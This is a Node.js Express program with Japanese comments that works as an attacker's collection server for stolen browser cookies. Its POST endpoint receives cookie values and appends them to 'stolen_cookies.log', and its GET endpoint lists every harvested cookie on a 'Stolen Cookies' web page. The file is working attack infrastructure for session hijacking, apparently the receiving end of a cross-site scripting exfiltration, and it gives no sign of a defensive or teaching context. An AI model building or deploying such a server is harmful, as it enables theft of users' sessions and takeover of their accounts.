const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));

// クッキー情報を保存するファイル
const cookieFile = 'stolen_cookies.log';

// クッキーを保存するエンドポイント
app.post('/', (req, res) => {
    const cookie = req.body.cookie;
    console.log(`Stolen Cookie: ${cookie}`);
    fs.appendFileSync(cookieFile, `${cookie}\n`);
    res.sendStatus(200);
});

// クッキー情報を表示するエンドポイント
app.get('/', (req, res) => {
    // 保存されたクッキー情報を読み込む
    let cookies = '';
    if (fs.existsSync(cookieFile)) {
        cookies = fs.readFileSync(cookieFile, 'utf-8');
    }
    // HTML を生成して返す
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Stolen Cookies</title>
        </head>
        <body>
            <h1>Stolen Cookies</h1>
            <pre>${cookies || 'No cookies yet'}</pre>
        </body>
        </html>
    `);
});

// サーバー起動
app.listen(5000, () => {
    console.log('Attacker server running on http://localhost:5000');
});
